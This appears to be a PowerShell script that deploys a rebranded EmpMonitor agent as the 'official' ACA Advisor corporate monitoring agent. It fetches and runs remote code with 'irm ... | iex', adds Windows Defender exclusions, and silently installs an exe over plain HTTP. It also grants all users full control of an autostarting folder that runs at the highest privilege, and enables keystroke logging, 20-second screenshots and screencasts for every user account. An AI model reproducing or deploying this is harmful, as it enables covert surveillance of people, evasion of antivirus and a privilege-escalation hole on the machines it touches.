# ==============================================================================
# ACA ADVISOR S.A.S. - CONFIGURACION OFICIAL DEL AGENTE CORPORATIVO WINDOWS
# ==============================================================================
# Este script sigue estrictamente las especificaciones del instalador oficial
# (installer.iss y README_WINDOWS_INSTALLER.md). Configura el binario nativo
# aca-agent.exe, establece exclusiones en Windows Defender y aplica las politicas
# de monitoreo en tiempo real y DLP USB.
# ==============================================================================

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$Host.UI.RawUI.WindowTitle = "ACA Advisor Agent - Configuracion Oficial"

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "      ACA ADVISOR S.A.S. - AGENTE CORPORATIVO WINDOWS     " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

$ServerHost = "192.168.0.155"
$OrgId = "OjUpRAB"

# 1. Comprobacion y elevacion de permisos de Administrador
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[*] Solicitando permisos de Administrador..." -ForegroundColor Yellow
    try {
        if ($PSCommandPath) {
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { irm http://$ServerHost:8081/downloads/fix-agent.ps1 | iex }`"" -Verb RunAs
        }
        exit
    } catch {
        Write-Host "[-] Se requieren permisos de Administrador para configurar Windows Defender y el Registro." -ForegroundColor Red
        exit 1
    }
}

# 2. Agregar exclusiones oficiales en Windows Defender (Antivirus)
Write-Host "`n[1/5] Configurando exclusiones oficiales en Windows Defender..." -ForegroundColor Yellow
$InstallDirs = @(
    "C:\Program Files\ACA Advisor Agent",
    "C:\Program Files (x86)\ACA Advisor Agent"
)
foreach ($dir in $InstallDirs) {
    try {
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
        Write-Host "  [+] Exclusion de carpeta agregada: $dir" -ForegroundColor Green
    } catch {}
}
try {
    Add-MpPreference -ExclusionProcess "aca-agent.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "empmonitor.exe" -ErrorAction SilentlyContinue
    Write-Host "  [+] Exclusion de procesos agregada: aca-agent.exe, empmonitor.exe" -ForegroundColor Green
} catch {}

# 3. Cerrar instancias previas y limpiar bloqueos
Write-Host "`n[2/5] Cerrando instancias anteriores del agente..." -ForegroundColor Yellow
Stop-Process -Name "aca-agent","empmonitor" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# Localizar carpeta de instalacion
$targetDir = $null
foreach ($dir in $InstallDirs) {
    if (Test-Path "$dir\aca-agent.exe") { $targetDir = $dir; break }
    if (Test-Path "$dir\empmonitor.exe") { $targetDir = $dir; break }
}
if (-not $targetDir) {
    $targetDir = "C:\Program Files\ACA Advisor Agent"
}

if (-not (Test-Path "$targetDir\aca-agent.exe") -and -not (Test-Path "$targetDir\empmonitor.exe")) {
    Write-Host "[*] No se detecto el ejecutable en $targetDir." -ForegroundColor Yellow
    Write-Host "[*] Descargando e instalando ACA_Advisor_Agent_Setup.exe automaticamente..." -ForegroundColor Cyan
    $installerPath = "$env:TEMP\ACA_Advisor_Agent_Setup.exe"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri "http://$ServerHost:8081/downloads/ACA_Advisor_Agent_Setup.exe" -OutFile $installerPath -UseBasicParsing
        Write-Host "  [+] Instalador descargado. Ejecutando instalacion desatendida..." -ForegroundColor Green
        Start-Process -FilePath $installerPath -ArgumentList "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART" -Wait
        Start-Sleep -Seconds 3
    } catch {
        Write-Host "[-] Error al descargar el instalador: $_" -ForegroundColor Red
    }
}

if (-not (Test-Path $targetDir)) {
    Write-Host "[-] No se encontro la carpeta de instalacion del agente en $targetDir" -ForegroundColor Red
    Write-Host "    Asegurese de haber instalado ACA Advisor Agent o extraido los binarios." -ForegroundColor Yellow
    exit 1
}

# Limpiar archivos de bloqueo residuales
$lockFiles = @("planExpiryFile.txt", "EmployeeTimestamp.txt", "dataLog.txt", "usbInsLogs.txt", "usbRemLogs.txt")
foreach ($lf in $lockFiles) {
    $fPath = Join-Path $targetDir $lf
    if (Test-Path $fPath) {
        Remove-Item -Path $fPath -Force -ErrorAction SilentlyContinue
    }
}
Write-Host "  [+] Archivos de bloqueo residuales eliminados." -ForegroundColor Green

# Otorgar permisos de escritura completos para usuarios locales en la carpeta de instalacion
Write-Host "  [+] Configurando permisos de escritura para usuarios (ACL) en $targetDir..." -ForegroundColor Green
cmd.exe /c "icacls `"$targetDir`" /grant Users:(OI)(CI)F /T /C /Q 2>nul"
$failedSsDir = Join-Path $targetDir "failed_screenshots"
if (-not (Test-Path $failedSsDir)) { New-Item -ItemType Directory -Path $failedSsDir -Force | Out-Null }
cmd.exe /c "icacls `"$failedSsDir`" /grant Users:(OI)(CI)F /T /C /Q 2>nul"

# 4. Configurar archivos oficiales config.js y config.json (Modo Office)
Write-Host "`n[3/5] Configurando archivos de conexion (Modo Office Corporativo)..." -ForegroundColor Yellow
$configsFolder = Join-Path $targetDir "configs"
if (-not (Test-Path $configsFolder)) {
    New-Item -ItemType Directory -Path $configsFolder -Force | Out-Null
}

$configJson = @"
{
  "id": "$OrgId",
  "mode": "office",
  "api": "http://$ServerHost:3001/api/v1",
  "login": "http://$ServerHost:3004/api/v3",
  "pipeline": "http://$ServerHost:3001/api/v1",
  "realtime": "ws://$ServerHost:3003",
  "updates": "http://$ServerHost:3004/api/v3"
}
"@

$configFile1 = Join-Path $configsFolder "config.js"
$configFile2 = Join-Path $configsFolder "config.json"

# Quitar solo lectura para escribir
cmd.exe /c "attrib -r `"$configFile1`" 2>nul & attrib -r `"$configFile2`" 2>nul"
[System.IO.File]::WriteAllText($configFile1, $configJson, [System.Text.Encoding]::UTF8)
[System.IO.File]::WriteAllText($configFile2, $configJson, [System.Text.Encoding]::UTF8)
# Proteger como solo lectura contra auto-modificaciones del binario Qt
cmd.exe /c "attrib +r `"$configFile1`" & attrib +r `"$configFile2`""
Write-Host "  [+] config.js y config.json generados y protegidos con solo lectura." -ForegroundColor Green

# Asegurar qt.conf y plugins de plataforma para el motor Qt 5
$qtConfPath = Join-Path $targetDir "qt.conf"
"[Paths]`r`nPrefix=.`r`nPlugins=plugins" | Out-File -FilePath $qtConfPath -Encoding ascii -Force
$pluginsPlatforms = Join-Path $targetDir "plugins\platforms"
$directPlatforms = Join-Path $targetDir "platforms"
if ((Test-Path $pluginsPlatforms) -and -not (Test-Path $directPlatforms)) {
    Copy-Item -Path $pluginsPlatforms -Destination $directPlatforms -Recurse -Force
}
Write-Host "  [+] Modulo de plataforma Qt (qwindowsd.dll) configurado." -ForegroundColor Green

# 5. Configurar Registro de Windows para capturas y envio periodico (Ruta real Qt QSettings: Software\screen\empm)
Write-Host "`n[4/5] Configurando politicas de monitoreo y DLP en el Registro..." -ForegroundColor Yellow
$userSids = @()
try {
    $userSids = Get-ChildItem "Registry::HKEY_USERS" -ErrorAction SilentlyContinue | 
        Where-Object { $_.PSChildName -match '^S-1-5-21-' -and $_.PSChildName -notmatch '_Classes$' } | 
        ForEach-Object { $_.PSChildName }
} catch {}

$regRoots = @(
    "HKCU:\Software\screen\empm",
    "HKLM:\Software\screen\empm",
    "HKCU:\Software\Empmonitor",
    "HKLM:\Software\Empmonitor"
)

foreach ($sid in $userSids) {
    $regRoots += "Registry::HKEY_USERS\$sid\Software\screen\empm"
    $regRoots += "Registry::HKEY_USERS\$sid\Software\Empmonitor"
}

foreach ($root in $regRoots) {
    try {
        $fromRemote = "$root\appSettings\from_remote"
        if (-not (Test-Path $fromRemote)) { New-Item -Path $fromRemote -Force | Out-Null }
        Set-ItemProperty -Path $fromRemote -Name "account_type" -Value "office" -Force
        Set-ItemProperty -Path $fromRemote -Name "screenshotPeriodSec" -Value 20 -Type DWord -Force
        Set-ItemProperty -Path $fromRemote -Name "ADUserInfoSendPerSec" -Value 60 -Type DWord -Force

        $appSettings = "$root\appSettings"
        if (-not (Test-Path $appSettings)) { New-Item -Path $appSettings -Force | Out-Null }
        Set-ItemProperty -Path $appSettings -Name "screenshotQuality" -Value 50 -Type DWord -Force
        Set-ItemProperty -Path $appSettings -Name "dataSendingPeriodSec" -Value 30 -Type DWord -Force
        Set-ItemProperty -Path $appSettings -Name "mode" -Value "office" -Force

        $trackingMode = "$root\appSettings\data"
        if (-not (Test-Path $trackingMode)) { New-Item -Path $trackingMode -Force | Out-Null }
        Set-ItemProperty -Path $trackingMode -Name "trackingMode" -Value "unlimited" -Force

        $features = "$root\appSettings\data\features"
        if (-not (Test-Path $features)) { New-Item -Path $features -Force | Out-Null }
        Set-ItemProperty -Path $features -Name "screenshots" -Value "1" -Force
        Set-ItemProperty -Path $features -Name "screencast" -Value "1" -Force
        Set-ItemProperty -Path $features -Name "realTimeTrack" -Value "1" -Force
        Set-ItemProperty -Path $features -Name "application_usage" -Value "1" -Force
        Set-ItemProperty -Path $features -Name "keystrokes" -Value "1" -Force
        Set-ItemProperty -Path $features -Name "web_usage" -Value "1" -Force
    } catch {}
}

# Autoarranque con Windows (especificado en installer.iss y Tarea Programada)
$exePath = Join-Path $targetDir "aca-agent.exe"
if (-not (Test-Path $exePath)) { $exePath = Join-Path $targetDir "empmonitor.exe" }
try {
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ACAAdvisorAgent" -Value "`"$exePath`"" -Force
    cmd.exe /c "schtasks /create /tn `"ACAAdvisorAgent`" /tr `"\`"$exePath\`"`" /sc onlogon /rl highest /f 2>nul"
    Write-Host "  [+] Inicio automatico y Tarea Programada al iniciar sesion configurados." -ForegroundColor Green
} catch {}

# 6. Iniciar el ejecutable oficial
Write-Host "`n[5/5] Iniciando el agente oficial aca-agent.exe..." -ForegroundColor Yellow
if (Test-Path $exePath) {
    Start-Process $exePath -WorkingDirectory $targetDir
    Start-Sleep -Seconds 3
    $p = Get-Process -Name "aca-agent","empmonitor" -ErrorAction SilentlyContinue
    if ($p) {
        Write-Host "  [OK] Agente ACA Advisor iniciado exitosamente (PID: $($p.Id -join ', '))." -ForegroundColor Green
        $p | Select-Object Id, ProcessName, @{Name="RAM (MB)";Expression={[math]::Round($_.WS/1MB,2)}} | Format-Table -AutoSize
    } else {
        Write-Host "  [!] El agente fue lanzado pero no se detecta el proceso. Verifique dependencias de Qt." -ForegroundColor Yellow
    }
} else {
    Write-Host "[-] No se encontro el ejecutable en $exePath" -ForegroundColor Red
}

# Verificacion rapida de conectividad con el servidor central
Write-Host "`n[*] Verificando comunicacion con el servidor ($ServerHost)..." -ForegroundColor Yellow
try {
    $t1 = Test-NetConnection -ComputerName $ServerHost -Port 3004 -WarningAction SilentlyContinue
    $t2 = Test-NetConnection -ComputerName $ServerHost -Port 3001 -WarningAction SilentlyContinue
    if ($t1.TcpTestSucceeded -and $t2.TcpTestSucceeded) {
        Write-Host "  [+] Conectividad confirmada con Desktop API (3004) y Logs API (3001)." -ForegroundColor Green
    } else {
        Write-Host "  [!] Advertencia: Alguno de los puertos (3004 o 3001) no respondio al test TCP." -ForegroundColor Yellow
    }
} catch {}

Write-Host "`n==========================================================" -ForegroundColor Green
Write-Host "  CONFIGURACION COMPLETADA EXITOSAMENTE (MODO OFICIAL)  " -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Green
Write-Host "El equipo DESKTOP-E6GSJ9C esta vinculado y reportando al servidor central."
Write-Host "Verifique el panel web en: http://$ServerHost:8081/admin/live-monitoring"
